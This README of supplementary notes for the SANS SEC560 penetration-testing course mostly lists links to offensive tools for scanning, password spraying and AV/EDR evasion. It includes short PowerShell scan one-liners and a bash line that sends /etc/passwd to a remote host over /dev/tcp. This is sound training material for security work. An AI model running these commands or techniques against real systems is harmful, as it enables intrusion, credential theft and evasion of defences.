# 560-Extras
Notes and other extras related to SANS SEC560

## Day 1


## Day 2


### Proxying traffic and rotating source IP
https://github.com/ustayready/fireprox (more for web traffic, but always worth mentioning)

https://github.com/blacklanternsecurity/TREVORproxy

https://github.com/Shellntel/scripts/blob/master/proxyCannon.py


### PktMon - Windows native packet capture

https://learn.microsoft.com/en-us/windows-server/networking/technologies/pktmon/pktmon


### Other port and host scanning options

RustScan: https://github.com/RustScan/RustScan

How to write a port scanner in Go: https://github.com/jboursiquot/portscan

PowerShell ping sweep example: 
```
1..60 | % {echo $_; ping -n 1 -w 100 10.10.10.$_ | select-string ttl}
```

PowerShell port scan example: 
```
70..90 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50",$_)) "Port $_ is open" } 2>$null
```

### Bash /dev/tcp fun

Connect to a port: 
```
echo "" > /dev/tcp/142.250.138.139/443
```

Send a file: 
```
cat /etc/passwd > /dev/tcp/10.10.10.10/4444
```

### All the cats

Powercat: https://github.com/besimorhino/powercat

Nmap's ncat: https://nmap.org/ncat/

pwncat, "python netcat on steroids": https://github.com/cytopia/pwncat

socat: https://linux.die.net/man/1/socat

lolcat (lol): https://github.com/busyloop/lolcat

Awesome lolcat from Jeff McJunkin:
```
while true; do fortune | cowsay -f $(find /usr/share/cowsay/cows/ -type f | sort -R | head -n1) |
lolcat -a -s 40; sleep 2; done
```

Can use telnet, too (although it is not a cat): telnet ip port


### NSE script using the Vulners.com API

https://github.com/vulnersCom/nmap-vulners


### Auto-updated wordlist for pw guessing based on current, relevant seasons, months, and year

http://weakpasswords.net/


### Skull Security for useful lists

https://wiki.skullsecurity.org/index.php/Passwords


### Password Spraying

DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray/

SprayingToolkit: https://github.com/byt3bl33d3r/SprayingToolkit

TrevorSpray: https://github.com/blacklanternsecurity/TREVORspray


## Day 3

### Verizon Data Breach Investigation Report

https://www.verizon.com/business/resources/reports/dbir/


### Living off the land

Windows: https://lolbas-project.github.io/

Linux: https://gtfobins.github.io/


### PowerShell command history files

%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


### Daily builds of various C# security tools

https://github.com/Flangvik/SharpCollection


### Custom Bloodhound queries

https://github.com/hausec/Bloodhound-Custom-Queries


## Day 4


### AV Bypass

DefenderCheck: https://github.com/matterpreter/DefenderCheck

AMSITrigger: https://github.com/RythmStick/AMSITrigger

https://vanmieghem.io/blueprint-for-evading-edr-in-2022/

https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html

https://github.com/TheWover/donut

Talk the Windows API directly with PowerShell: https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1/

## Day5
